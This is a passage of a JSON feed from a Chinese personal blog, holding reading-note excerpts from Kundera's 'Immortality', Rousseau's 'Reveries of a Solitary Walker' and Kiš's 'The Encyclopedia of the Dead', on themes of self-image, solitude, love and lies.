            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/57%E3%80%8A%E4%B8%8D%E6%9C%BD%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/",
            "title": "《不朽》米兰·昆德拉",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他突然醒悟，别人眼中的他和他自己眼中的他是不一样的，和他以为的别人眼中的他也是不一样的。</p>\n<h3 id=\"5-6\"><a class=\"markdownIt-Anchor\" href=\"#5-6\">#</a> 5-6</h3>\n<p>我们身上有一部分始终生活在时间之外，也许我们只有在某些特定时刻–大部分是没有年龄的时刻–才会意识到自己的年龄。</p>\n<p>从造物主的观点看，所有其他一切都是无足轻重的，只不过是总程序中的一些简单的变化和转换游戏，而总程序与未来的预测毫无关系，只不过规定了可能性的范围。在这些范围以内，它完全让偶然性起作用。</p>\n<p>如果造物主的电子计算机的活动范围仅仅限于我们这个星球，如果我们的一切都取决于它，而且只取决于它，那么我们在死后所能期待的只是我们活着时已经认识到的东西的一种变化；我们只能遇到一些相类似的景象和相类似的创造物。</p>\n<p>阿捏丝的一生好像是在兜圈子：在离开他原先的生活环境以后，她勇敢地闯入一个完全不同的世界，随后她又重新朝她的出发点走去。</p>\n<p>这就仿佛是她竭力所想粉碎的一种厄运：尽力勇往直前，不愿偏离，可是她总是做不到。在这种日常的、平庸的、力量的考验之中，失败的总是她。</p>\n<p>仇恨的圈套，就在于它把我们和我们的敌手栓的太紧了。</p>\n<p>船上的人推推拉拉，挤在一起，使他非常腻味，他宁愿淹死拉倒。和这些人相互打斗、践踏，把对方往死里推的人肉体接触，要比独个儿死在纯净的海水里更加糟糕。</p>\n<p>我不恨他们，因为没有任何东西把我和他们连在一起，我们毫无共同之处。</p>\n<p>她很想知道他们的情况，可是她却既不想见到他们，也不想跟他们生活在一起。</p>\n<p>这个时代里，个人已经没有什么自主权了，他已经属于别人所有了。</p>\n<p>从前，这些人的政治和科学发明把她迷惑住了，她想就在他们的冒险事业中充当一个小角色。一直到有一天她产生那种她和这些人是不一样的感觉之后，她的想法就改变了。</p>\n<p>这种感觉是很奇怪的，她知道这是荒谬的，是不道德，想抵制它，可是最终她还是认为她不能支配她的感觉。她不能为这些人战争感到苦恼，也不能为他们的节庆感到高兴，因为她深信所有的这一切都与她无关。</p>\n<h3 id=\"5-7\"><a class=\"markdownIt-Anchor\" href=\"#5-7\">#</a> 5-7</h3>\n<p>阿捏丝对他们施舍并不是因为他们是人类的一部分，而是因为他们和人类不一样，因为他们已经被从人类中排挤出去了，也很可能和她一样，已经和人类分道扬镳了。</p>\n<p>如果她真的爱一个人，那么她对其他人的命运不会漠不关心，因为她所爱的这个人和其他人是共命运的，和这个命运是有直接关系的。</p>\n<p>他们所有的共同生活都建立在爱情的幻想之上，建立在两个人共同耕耘并尽心维护的幻想之上。</p>\n<p>他一生最美好的时刻莫过于躺在棺材里梦想，他居住在他的不朽中。</p>\n<p>他还没有进入一个讲究礼仪的世界，还用不到非循规蹈矩不可，它可以随时随地地暴露感情，不必考虑是否合适。</p>\n<p>所有人都活在超越人的认识的，超越自我的境界之中，双手伸向远处，伸向他们的尽头，甚至更远，伸向浩瀚的非存在。</p>\n<p>我将小心翼翼的绕过你，不碰到你，我不会紧紧拥抱你，也不会吻你。首先，因为我没有那方面的欲望，其次，因为我知道，所有我做的事情，你都要把它们变成你手中的子弹。</p>\n<p>凡是能到达的人都知道，真正的自由就在那里，而不在任何别的地方。</p>\n<p>被世界出卖的人淘金了自己的内心世界、陷入怀旧、梦幻、反抗；他被在他心中响起的痛苦的声音所震惊，再也听不到外界的呼唤了。</p>\n<p>一旦它把您弄到它的船上，您就永远下不来了，即使您像我一样开枪打自己的脑袋，您还是留在他的船上，连同您的自杀也一切留下了。</p>\n<p>整整一生，这些人都要围着他转。但是有什么办法呢，一定得忍受。</p>\n<p>肉体不仅仅指能在镜子里看到的东西，最珍贵的一部分肉体在里面。</p>\n<h3 id=\"5-8\"><a class=\"markdownIt-Anchor\" href=\"#5-8\">#</a> 5-8</h3>\n<p>他们尽力增加，为了创造一个唯一的、难以模仿的 “我”，可是同时又变成这些新增加的属性的宣传员；为了让绝大多数人和他们相像，他们使出了全力，结果却是，他们来之不易的 “我”，很快便烟消云散了。</p>\n<p>在某种界限以外，谋杀变成了一种英雄行为，而他始终认不清界限在哪里。</p>\n<p>他的处境很像是一个在黑板前被提问的中学生，为了摆脱困境，他想使用一个老办法：装作是回答问题，实际上再说他已经准备好了的话。</p>\n<p>民意测验成了高级现实，更可以说，成了真理。民意测验是一个常设议会，它的任务是产生真理，我们甚至可以说是产生前所未有的最最民主的真理。</p>\n<p>这些体系存在的时间不长，每一种都很快被另一种取代，可是他们影响了我们的行为，我们的政治观点，我们的审美趣味，甚至影响了我们所喜爱的地毯的颜色和书的选择。</p>\n<p>在他们强加给你各种使人讨厌的注意事项时，他们的脸上却堆满了笑容。他们使用的词汇只不过有六十来个，句子简短的从来不超出四个字。他们的讲话中夹杂着两三个难以理解的技术词汇，最多表示一两个非常浅薄的念头。这就是他们权力的证明。</p>\n<p>他们的争论什么也改变不了，也不会有任何结果，更不会影响事情的发展，它完全是无效的、无用的，被限制在这个食堂臭烘烘的气氛里。可是请看看这一小群围在桌子旁全神贯注的听众吧！他们全都默默地在听着，甚至忘了喝他们的咖啡。</p>\n<p>事实上，他们捍卫的意见对他们而言根本无关紧要，可是因为他们把他们的意见当成了他们的 “我” 的一个属性，所以对这种一件的攻击便变成了用针刺他们的皮肉。</p>\n<p>他突然醒悟，别人眼中的他和他自己眼中的他是不一样的，和他以为的别人眼中的他也是不一样的。</p>\n<h3 id=\"5-9\"><a class=\"markdownIt-Anchor\" href=\"#5-9\">#</a> 5-9</h3>\n<p>事实就是如此。这个法则对所有人都是有效的：我们永远不知道为什么和在哪件事上惹恼了别人，在哪件事上讨了他们的喜欢，在哪件事上使他们觉得我们可笑。我们的形象对我们自己来说也是神秘莫测的。</p>\n<p>只要我们生活在人类之中，我们必将是人们看待我们的那个样子。当一个人不断地子文别人是怎么看我们的，尽力想得到别人的好感时，他就可以被看作是一个骗子或一个滑头。</p>\n<p>我们的 “我” 是一个普通的、抓不住的、难以描绘的、含糊不清的形象。而唯一的几乎不再容易抓住和描绘的真实，就是我们在别人眼里的形象。最糟的是，你不是你形象的主人。你首先试图描绘你自己，随后至少要保持对它的影响，要控制它，可是没有用：只要有一句不怀好意的话就能把你永远的变成一副可怜的漫画。</p>\n<p>贝尔纳张开的嘴在城里所有的墙上笑着，他感到自己被钉在犯人示众柱上：人人都在看他，研究他，评论他。</p>\n<p>对我来说，真正的生活是活在别人的思想里。没有这个，尽管活着，那也是个死人。</p>\n<p>如果我没有能够说服你，我也没有权利在任何事上制止你。</p>\n<p>没有一点儿疯狂，生活就不值得过。就让洛拉去听凭内心的呼声的引导吧！为什么要把我们的每一个行动像一块薄饼似的在理智的煎锅上翻来覆去的煎呢。</p>\n<p>在爱情上，重要的是你爱的那个人。有关系的是他，而决不是别的什么。我在考虑，对一个眼睛里只看得到自己的女人来说，爱情是什么。换句话说，我在考虑一个绝对以自我为中心的女人来说爱情这个词儿到底有什么意义。</p>\n<p>她希望把这个肉体陈放在在他们的客厅中央，把它留在那儿。把它留在那儿，沉重，而且一动不动。如果他们不希望它在他们家里，还迫使他们一个抓住手腕，一个抓住脚，把这肉体抬起来，扔到人行道上去。</p>\n<h3 id=\"5-10\"><a class=\"markdownIt-Anchor\" href=\"#5-10\">#</a> 5-10</h3>\n<p>爱情并不需要回报，他本身包含着召唤和回答，它自己满足自己。</p>\n<p>我不应该害怕沉湎于这种感情，因为这不是我种在心里的。</p>\n<p>转移到个人灵魂里，善与恶的标准变成主观的了。如果某人的灵魂充满了爱，一切都会好得不能再好，这个人是善良的，他所做的一切都是好的。</p>\n<p>感情一旦被看成一种价值，大家都愿意去感受他；因为我们全都对我们的价值感到骄傲，所以炫耀我们价值的诱惑是巨大的。</p>\n<p>我们互相转让、借用或者窃取我们的见解，我们想的几乎差不多一样。</p>\n<p>当痛苦变得剧烈时，世界就消失了，剩下我们每个人单独跟自己在一起。</p>\n<p>您知道在永恒的诉讼中，我从来没有说过一个字。这是出于蔑视。但是我还是禁不住要去看看，听他们讲些什么。我为之感到遗憾。</p>\n<p>反对魔鬼，还没有什么有效的和合理的斗争。马克思尝试过，而到头来，魔鬼适应于一切原先旨在消灭他的组织。</p>\n<p>要么放弃抗争，不再做他自己，要么不断培育反叛的内心需求，并不时表现出来。</p>\n<p>一走了之的计划在她看来越来越不自然，是被迫作出和不可实现的，一个人在内心明明知道什么事也不能做并且不会做，便会孕育这种幻想。</p>\n<p>凡是没有向结局狂奔的内容，就应该觉得枯燥无味了？在品尝这块美味的鸡腿时，你感到厌烦吗？你会匆匆奔向目标吗？</p>\n<p>你对无聊的事很感兴趣，而严肃的事令你厌烦，酷似一个年老的女门房。</p>\n<p>这种愿望根植在她的存在的土壤里，慢慢的在她身上生长。</p>\n<p>她遭到的不公正对待也许分量很轻。她千百次想反抗，发出抗议的喊声，可是一直委决不下，因为她的声带在愤怒时会断裂。她比别人更软弱，继续逆来顺受。她自身的软弱侮辱她，凌辱她，面对软弱，她绝对毫无防卫。她唯有自我毁灭，才能消除自身的软弱。</p>\n<p>她生活的任何一天，她说过的每一句话都令她感到不满意。她就像自己所憎恨的，却无法摆脱的可怕重负那样在生活中穿行。</p>\n<h3 id=\"5-11\"><a class=\"markdownIt-Anchor\" href=\"#5-11\">#</a> 5-11</h3>\n<p>对她来说，世界逐渐变得沉默寡言，不再成为她的世界。她完全禁锢在自身和痛苦之中。她也不能通过别人的痛苦，摆脱自己的禁锢。</p>\n<p>事实上，她早就不再生活在这个世界上，除了她自己的心灵，她没有别的世界。</p>\n<p>这个世界没有任何意义，这是一个纯粹空旷的空间，除了能让她行走，让她痛苦的心灵从一个地方转到另一个地方，以期减轻痛苦之外，没有任何意义。</p>\n<p>由于我们的世纪绝不承认人具有与尘世不协调的权利。像法布利斯那样的人能够归隐的修道院都不存在了。再也没有能够摆脱尘世和人的地方。</p>\n<p>生活，生活并无任何幸福而言。生活，就是在这尘世中带着痛苦的自我。</p>\n<p>微笑留在她的嘴唇上，即便她忘记了笑的原因。她好疲惫，一切都使她疲惫，尤其她没有精力忍受别人的注视。她紧闭双目，为的是不再看见任何人任何东西。在她周围发生的一切都令她讨厌和难受，她希望什么事也不要发生。</p>\n<p>在你的生活中企图建立一种 “新生活 “，与先前的生活毫无关系，像通常所说，从零开始，那是空想。你的生活将总是由同样的材料、同样的砖头，同样的问题构成，你开初认为的新生活，不久显象为过去生活的简单变异。</p>\n<p>消失的道路隐没在画家的心灵里，他们具有向前走的不可遏制的愿望。可是，如果不再有道路，向前走到哪里呢？朝哪个方向去寻找没有希望的向前呢？画家们只得四处乱跑起来。</p>\n<p>有用意味着什么？自古至今，一切人的有用的总和完全包含在今天这样的世界中：所以没有什么比无用更道德的了。</p>\n<p>在爱情以外的故事，不管多么美丽，必然的具有插曲的性质。</p>\n<p>她茫无所见，仿佛她不想看见外界事物，只把精力集中在自己身上。</p>\n<p>她们在地球以外的过去将永远不为地球上的人所知晓，因此，地球上的人丝毫不理解她们的心理，她们永远不能理解她们所说所做的事对她们产生的效果，他们永远猜度不出隐藏在他们面孔后面的感觉。</p>\n<h3 id=\"5-12\"><a class=\"markdownIt-Anchor\" href=\"#5-12\">#</a> 5-12</h3>\n<p>对他来说，了解人生比为权力斗争更加重要。他所有的朋友追逐名利的生活，他觉得咄咄逼人，又单调空虚。他认为艳遇会把他引导到生活中心，真正充实、丰富而又神秘，诱人而又具体的生活中心。</p>\n<p>人们可以藏在自己的形象后面，可以离开自己的形象；人永远不是自己的形象。她在他们之间筑起了一道无用信息的屏障。他们彼此只知道最低限度的必要的情况，几乎洋洋得意的把他们的生活藏在昏暗之中，这使他们的重逢显得格外明亮，摆脱了时间，同一切情况切断联系。</p>\n<p>笑是脸部的一种痉挛，在痉挛中，人控制不住自己，而由某种既非意志，亦非理智的东西所控制。</p>\n<p>向傻瓜证明什么，那是白费心机。我只想跟他们开玩笑。</p>\n<p>我却觉得没有人认真对待任何事，大家都千方百计寻开心，仅此而已。</p>\n<p>幽默只能存在于人们还能分辨出重要的与不重要的界限之外。如今，这个界限难以分辨了。</p>\n<p>阶级不平等比起这种把有些人变成沙粒，而给另外一人赋予存在感的形而上的不平等，简直是小巫见大巫。</p>\n<p>没有社会渣渣将一事无成。他们是革命正义和革命仇恨的工具。</p>\n<p>一个人的作品不过是他伪装过的生平，而它跟任何一个人的生平一样微不足道。</p>\n<p>他们看重的是赞赏，而不是纵情声色。看重的是表面，而不是实际。实际对任何人都毫无意义。对任何人都是如此。</p>\n<p>如果我们拒绝看重自认为重要的世界，如果我们在这个世界上找不到任何对我们笑声的回应，那么我们只剩下一个解决办法：把世界看成一个整体，使之变成我们游戏的对象，使之变成一个玩具。</p>\n<h3 id=\"5-13\"><a class=\"markdownIt-Anchor\" href=\"#5-13\">#</a> 5-13</h3>\n<p>他在游戏，而游戏在一个毫无意义的世界上是他唯一看重的东西。但是这游戏不使任何人喜笑颜开，他也知道这种情形。当他向别人陈述自己的计划时，并不是为了取悦他们。这是为了取悦自己。</p>\n<p>她想把它置于自己的眼睛面前，当做隐约可见的美的最后痕迹。</p>\n",
            "tags": [
                "人生哲学",
                "爱情"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/5%E3%80%8A%E4%B8%80%E4%B8%AA%E5%AD%A4%E7%8B%AC%E6%BC%AB%E6%AD%A5%E8%80%85%E7%9A%84%E9%81%90%E6%83%B3%E3%80%8B%E8%AE%A9%C2%B7%E9%9B%85%E5%85%8B%C2%B7%E5%8D%A2%E6%A2%AD/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/5%E3%80%8A%E4%B8%80%E4%B8%AA%E5%AD%A4%E7%8B%AC%E6%BC%AB%E6%AD%A5%E8%80%85%E7%9A%84%E9%81%90%E6%83%B3%E3%80%8B%E8%AE%A9%C2%B7%E9%9B%85%E5%85%8B%C2%B7%E5%8D%A2%E6%A2%AD/",
            "title": "《一个孤独漫步者的遐想》让·雅克·卢梭",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>世界上并没有纯粹的无意识行动，只要我们善于去寻找，都能从内心找出行动原因。</p>\n<h3 id=\"2-110\"><a class=\"markdownIt-Anchor\" href=\"#2-110\">#</a> 2-110</h3>\n<p>我不知怎么就走出了事物的正常秩序，堕入莫名其妙的混沌之中，我在其中什么也看不见。而且，我越是寻思自己所处的为止，就越不明白自己身在何处。</p>\n<p>终于，我觉得自己的努力纯属徒劳，兀自烦恼也无用，就做了唯一一个可做的决定，也就是服从命运安排，不再和天意抗争。</p>\n<h3 id=\"2-111\"><a class=\"markdownIt-Anchor\" href=\"#2-111\">#</a> 2-111</h3>\n<p>他们对我无所不用其极，诽谤、侮辱、讽刺、谩骂到极点，也就无法变本加厉了。</p>\n<p>我孤身一人，离群索居，要比生活在他们之中幸福百倍。</p>\n<p>公众对我的态度是受了恨我的那些团体的一次又一次的指使。人是会死的，可是那些团体不会死。其爱恨情仇会代代相传，其刻骨仇恨永不消失。</p>\n<p>从今以后，身外的一切都与我无关了，在这个世界上，我既无亲邻，也无友伴，更无兄弟。我住在地球上，就如同坠落在一个陌生星球上，只好在那里住下来。</p>\n<p>我既没有什么可以赞美，也没有什么可以指责。因为我从今往后在众人之间就是个不存在的人。我充其量只能表示如此，因为我与人们断绝了一切实在的联系，停止了真正的交往。</p>\n<p>我对这一切都不在乎了，人们可以在我生前将我夺走，但是夺不走我写作时的快乐，夺不走我对这些内容的回忆，夺不走我的孤独的沉思。且让他们来随意羞辱我吧，他们绝不可能阻止我享受无辜的快乐，绝不可能阻止我平和安定地结束一生。</p>\n<p>只有在孤独和沉思的时刻，我才是真正的我，才是符合本性的我，没有忧烦和拘束。</p>\n<p>那是，我在尘世中失去一却希望，再也找不到心灵所需的养料，因而渐渐习惯于用心灵自身滋养心灵，在自己身上寻找养料。</p>\n<p>真正的幸福之源就在我们自身，一个善于理解幸福的人，是不可能被别人弄到沦落潦倒的地步的。</p>\n<p>我孑然一身，形影相吊，已经感到严冬来临。想象力日渐枯竭，无法再按心灵的愿望创造美好的形象，来排遣人生的孤寂。</p>\n<p>我向来厌恶阴暗险恶的事情，本能的对他们产生反感。我虽然多年来遭受这种事情的包围，这种反感却一直存在，并且是有增无减。</p>\n<p>事实真实坦率，在上流社会就是可怕的罪衍。在我的同代人眼里，如果我所有的罪恶，就是不像他们那样虚伪，那样不讲信义，那么，在他们看来，我就是个面目狰狞的奸人。</p>\n<p>统治国家的人，占据高位的人，操纵舆论的人，为了一个共同的阴谋，走到了一起，勾结在一起，他们配合得如此默契，确实不寻常，但并非偶然。</p>\n<h3 id=\"2-112\"><a class=\"markdownIt-Anchor\" href=\"#2-112\">#</a> 2-112</h3>\n<p>二十年来，经验给我带来的确实一种叫人伤心的知识。有知受罪，无知更好。</p>\n<p>何况，你接受了这些姗姗来迟的教训，希望学有所成可还来不及运用，时机就逝去了。经验只有在你尚有来日时才有用，人都行将就木了，还用得着学习应该怎么样生活吗？</p>\n<p>还在孩提时代，我就被抛入人生的漩涡，早就感到我天生不是在此世生活的材料。</p>\n<p>在古人的本能需要无关的事情中，我们的信念就是我们的人生准则。</p>\n<p>我学习是为了认识自我，而不是教育别人。我历来认为，欲教别人，先要认识自己。</p>\n<p>我就是在福星高照的时候也感到，即使我获得了我一直认为在追求的一切，也根本找不到心灵所渴望但又不知道辨别的幸福。四十岁之前，我一直在贫困与幸运，理智与迷惘之间浮沉，虽然沾染了不少恶习，可是心里却没有不良倾向。我只是盲目的生活，缺乏理智所决定的原则，我忽略了自己的义务。</p>\n<p>摆脱了这种无益的诱惑，虚无的希望，我使对方万事不感兴趣，只求精神上的安宁。</p>\n<p>我深刻地回顾了来路，反躬自省。而且，为了使反思更加深刻，我没有放过任何与我有关的事情，可以说，我不与外人来往，喜欢孤身独处，就是从那个时候开始的。也是从那时起，这种离群索居的爱好就再也没有从我身上撤走。</p>\n<p>因为，他们是无神论的铁杆传播者和说一不二的教条主义者，不容别人在任何一点上持有不同的看法。</p>\n<p>我要一劳永逸的确定我的观点和原则，好好思考一番，看自己到底该做个什么样的人，想法定下来以后，有生之年就照着做。</p>\n<p>为享受尘世的荣华富贵而付出灵魂，其实在我看来这点，荣华富贵不值分文。</p>\n<p>我没有花时间去对付那些反对意见，因为我无法解答他们。我经过那么长久，那么认真的思索，终于选定了原则，我把那些选择当做坚定不移的信义标准，行为准则，就不管别人如何唱反调了，反正他们那些意见我也没法解答。</p>\n<p>这都不过是形而上学的巧辩和故弄玄虚，与我的理智所接受的，我的感情所确认的，我的内心冷静认可的基本原则相比毫无分量。</p>\n<p>如今，我的心极度悲伤，我的感觉因烦恼而衰弱，想象力因刺激而迟钝，头脑总是为不胜枚举的可怕奥秘所缠绕，机能因年老和忧伤而衰退，丧失了活力。人类的悟性受感官限制，不可能面面俱到地想清楚这些问题。</p>\n<h3 id=\"2-113\"><a class=\"markdownIt-Anchor\" href=\"#2-113\">#</a> 2-113</h3>\n<p>他们那种既无根由又无结果的道德没有任何能够渗入心灵与理智的东西，尽管他们在书中或某个引起轰动的戏中大肆渲染。或者我应该接受另一种秘密而无情的道德。</p>\n<p>不再为那些居心叵测的论据，无法接受的意见，和我无法克服，甚至人类智慧也无法克服的困难所动摇。在有生之年，无论什么事情，我都将按照我在最能够作出正确选择时所作出的决定行事。</p>\n<p>我有时也会为如此完全、持久、凄苦的孤独，为整个当今一代总是那么一触即发的仇恨，为他们不断使我遭受的侮辱而消沉低落。</p>\n<p>被我们那些伪学者拿来装点门面的知识是多么可怜。</p>\n<p>在社会上，书中的道德被视为无法实行的空谈。</p>\n<p>就无用的真理而言，谬误不见得比无知更糟。既然要给人造成伤害才能叫不公正，那么，没有伤害别人又怎么能说是不公正的呢？</p>\n<p>与其用理性的光芒，不如用良知的意愿去解决此类难以解决的道德问题。</p>\n<p>在我的行为操守上，道德虽然偶然在我的痴迷欲望面前沉默，但我记得事后它又重新控制了我的行为操守。</p>\n<p>带有某种道德教育的虚构，叫做寓言或神话。它们是包裹真理的装束。</p>\n<p>我几乎不按规则办事，或者说，我在任何事情上，都是率性而为。</p>\n<p>不过，我思维迟钝，贪图贫乏，有时为了把交谈继续下去，不得不借助于虚构。那些虚浮的人生乐趣，我都尝试过了，觉得没有什么意思。</p>\n<p>一生最甜蜜最快乐的时期，并不是最能引起回忆或最使我感动的时期。那些短暂的狂热和痴迷，无论多么强烈，却只是在生命长线上一些稀落的亮点，其原因，正是因为其强烈。而我怀念的幸福，却不是由一些转瞬即逝的时刻，而是由一些平凡而持久的状态构成的。</p>\n<p>我们的情感常常在我们之前或我们之后，去回忆那些不复再来的过去，或去预想那些常常实现不了的未来。尘世只有过眼云烟一般的快乐，而持久的幸福，我怀疑它是否存在。即使存在，也只在短暂的极乐之中。而这样一种转瞬即逝、只给我们的心留下不安和空虚，只让我们怀念过去冀望未来，算不上幸福。</p>\n<h3 id=\"2-114\"><a class=\"markdownIt-Anchor\" href=\"#2-114\">#</a> 2-114</h3>\n<p>当我们想起周围的事物，意念就会败坏我们遐想的魅力，把我们从内心强拽出来，当即戴上命运和人类的枷锁，重新感到不幸。</p>\n<p>世界上并没有纯粹的无意识行动，只要我们善于去寻找，都能从内心找出行动原因。</p>\n<p>一开始让我着迷的好事情，现在去做，就成了一种叫人无法忍受的束缚，在受惠者眼里，我最初做的好事，只不过是对今后继续做的事的担保。我这自觉自愿做的第一件善事，就成了他今后还要享受我其他善事的不成文权利。</p>\n<p>一切天生的爱好，包括行善本身，如果轻率地，不加选择的搬移或应用于社会，就肯定会改变性质，当初做这些事情是多么无益，以后就往往变得多么有害。</p>\n<p>他们一开始诚实，直爽，后来就变成了现在这个德性。他们的经历其实也是所有人的经历。我并不恨他们，因为我恨不起来，但是我忍不住鄙视他们，因为他们该当鄙视，我也忍不住向他们表现我的鄙视。</p>\n<p>我看到了人们的本来面目，轻易洞悉了他们的心底秘密，就会发现没有儿个人可爱得值得我爱，也没有几个人可恨得值得我恨。因为这些人的邪恶本身让我怜悯他们，我确切地知道，他们想害别人，其实害了自己。</p>\n<p>诱惑的力量是一个人无法抵挡的，也同样是全人类的弱点无法抵抗的。</p>\n<p>我从来就不曾适合过一个平民社会，因为平民社会里，什么事都离不开束缚，责任和义务。我生性放荡不羁，不可能依附别人。</p>\n<p>我的过错大多是由于不做事，很少是由于做事犯下的。我绝不相信，人只做自己意愿做的事才叫自由，而不做自己不愿做的事就不叫自由。我一贯要求的，经常保持的，就是后面这种自由。</p>\n<p>当代人积极行动，野心勃勃，既憎恨别人的自由，又不希望拥有自己的自由。只要有时能按自己的意愿行事，或确切地说只要能控制别人的意愿，他们就会一辈子做自己厌恶的事。</p>\n<p>我无力改变自己的处境，只有一些无伤大雅的癖好。至于人家怎么评判，我根本不管。我的理智甚至希望我在力所能及的范围内，做些遂意顺心的事情，公开做私下做都行，心血来潮就是规矩，不多的余力就是分寸。</p>\n<p>我满足自己的心血来潮，随性行事，自认为是很理智的，并就不刻意寻找做这个决定的理由。</p>\n<h3 id=\"2-115\"><a class=\"markdownIt-Anchor\" href=\"#2-115\">#</a> 2-115</h3>\n<p>理性允许我，甚至规定我沉迷于某种爱好，只要它吸引我，又没有什么阻止我这么做就行，但他没有告诉我，这种爱好凭什么吸引为，一门无利可图，无功可图，毫无发展的知识会有什么迷人的东西，竟能把我这个老态龙钟，说话啰嗦，行动迟缓，记性衰弱的人领来从事年轻人才做的练习和小学生才做的功课。</p>\n<p>我的眼睛不停的寻找，在这大千世界，不可能没有能逗留，吸引我目光的东西。</p>\n<p>我变得孤僻，或者如他们所说，落落寡合，愤世嫉俗。因为，在我看来，最孤寂难熬的生活，也比与那帮家伙交往要好，要知道那是些只知道背叛和仇恨的恶棍。</p>\n<p>我逃避人类，寻求孤独，不再想象，更少思考，然而，我性情活跃，它使我远离颓丧、忧郁的麻木状态，开始关心周围的一切事物。</p>\n<p>我并不努力获取学识，因为为时太晚。何况我不清楚，知识对生活幸福有什么促进。</p>\n<p>在里面掺入功利的动机，就再也不想求知而只想卖弄所知。</p>\n<p>一到某个杳无人迹的地方，我就呼吸的自然一点，而且好像到了一个不再有仇恨所折磨的避难所。</p>\n<p>其实名利本身并不值得如此追求，但大家认为的幸福的那些人却只做这种事情。</p>\n<p>在可怕的黑暗中，人家不断的把我往下拽，看不见一丝引路的光亮，看不出有任何依靠或者把手，能够让我站稳，并抗拒那引导我弃世的绝望。</p>\n<p>可是忽然间我发现自己被人丑化成一个可怕的从不曾存在的妖怪。我看见整个一代人毫不羞愧的接受了那种谬论，不要任何解释，也不做任何怀疑。</p>\n<p>我学会了毫无怨言的带上躲不掉的枷锁。我发现这一代人都发了疯，都感染了教唆者盲目的疯狂，去反对一个不幸的人。这个人不曾做过或想过伤害任何人的事情。</p>\n<p>具体的打击有时会落空，但害人的意图却是百发百中。</p>\n<p>在世上要做的事，就是把自己看成一个完全被动的人，不要徒劳无益地抗拒命运，而应该用剩下的气力去忍受命运。</p>\n<p>学会心平气和，默默忍受，痛苦也就失去了威力。我觉得真正需要的东西并不多，是预感和想象把需要扩大了。人之所以不安，之所以不幸。正是由于这一连串感觉。</p>\n<h3 id=\"2-116\"><a class=\"markdownIt-Anchor\" href=\"#2-116\">#</a> 2-116</h3>\n<p>所有的艰苦努力都没有生效，还是和从前一样容易烦恼，容易生气，容易受到伤害。</p>\n<p>那些不由自主的最初冲动是无法遏制的。每次受到打击，听任最初的发作自然而然地平息，身体反应的表现是理智无法控制的。我只能在未造成任何不良后果之前，尽量阻止其发展。</p>\n<p>天性的热烈的一面使我激动起来，天性的懒散的一面将我平息下来。命运的任何因素，人类的一切诡计，对于具有这种禀性的人，都起不了什么作用。要我长期感到痛苦，就必须使我对痛苦的感觉每时每刻不断出现。因为间歇时间无论多么短暂，都会使我恢复自己的天性。</p>\n<p>我很少见过幸福的人，也许一个也没见过，但我却常常见到一些心满意足的人。</p>\n<p>真正的快乐，不是以花钱多少来衡量的。</p>\n<p>我被这些外部感受牵制，除了开溜，实在无法躲避。陌生人的一个表情，一个手势，一个眼色都足以干扰我的快乐，或者抚慰我的痛苦。我只在一人独处时才属于自己，否则，就是被周围玩弄于股掌的对象。</p>\n<p>在日常交往中，还是本着发自内心的善意和礼貌去行事吧，这样一来，任何唯利是图，充满铜臭的东西，就不敢接近这么纯净的源泉，使之变质。</p>\n<p>只要心灵的待遇好过肉体，稍稍匮乏的生活是不难忍受的。</p>\n<p>后来的日子，由于我生性懦弱，心无主见，总是受别人的七情六欲的影响，激动动摇，以至于在动荡纷乱的生活中几乎事事被动，简直连自己该怎么行事，持什么操守都难以决定。那无情地生活需要不断地压在我身上。</p>\n<p>市井的喧嚣吵闹压抑和窒息这些情感，平静与安静难之复苏与兴奋。</p>\n",
            "tags": [
                "生命",
                "社会"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/61%E3%80%8A%E6%AD%BB%E4%BA%A1%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6%E3%80%8B%E4%B8%B9%E5%B0%BC%E6%B4%9B%C2%B7%E5%A5%91%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/61%E3%80%8A%E6%AD%BB%E4%BA%A1%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6%E3%80%8B%E4%B8%B9%E5%B0%BC%E6%B4%9B%C2%B7%E5%A5%91%E6%96%AF/",
            "title": "《死亡百科全书》丹尼洛·契斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们许诺天堂，而天堂是谎言，因为这全掌握在他们手中，因为他们就是站在天堂门口的人，他们的天使带着烧红的利剑，他们的判官举着错误的标准审观一切。</p>\n<h3 id=\"5-27\"><a class=\"markdownIt-Anchor\" href=\"#5-27\">#</a> 5-27</h3>\n<p>小说不可能反映全部事实，它只是表现作家眼中的世界。</p>\n<p>谎言重复得久了，自然会让人信以为真。因为人们需要信仰。</p>\n<p>他们勒索每个家庭，在每个人心中播下纷争的种子，凡是对他们的教义表示出丝毫疑虑的人都会遭到阴谋对付。</p>\n<p>他宣扬劳役而非自由，宣扬贫乏而非享乐，宣扬教义而非知识。</p>\n<p>他们不停地说谎，以至于被裹挟进巨大的谎言漩涡，甚至不知道自己在说谎。当每一个人都说谎时，便没有人说谎；当每一件事都是谎言时，便无一事是谎言。天国、公义的国是谎言。</p>\n<p>他们许诺天堂，而天堂是谎言，因为这全掌握在他们手中，因为他们就是站在天堂门口的人，他们的天使带着烧红的利剑，他们的判官举着错误的标准审观一切。</p>\n<p>为你此刻的屈从，此刻的祈祷，此刻的沉默，他们拼凑出一套疯狂的虚假诺言给你：他们许诺你未来，一个不存在的未来。</p>\n<p>在天堂的黑幕之下，在尘世的阴暗围墙之中，在生命的地牢里–以他们虚造的天堂之名，和对他们虚假的地狱的恐惧，他们教你鄙视财富，拒绝肉体的欢愉，轻视女人–那杯琼浆，那瓮极乐，仿佛这样的生活并不是地狱。</p>\n<h3 id=\"5-28\"><a class=\"markdownIt-Anchor\" href=\"#5-28\">#</a> 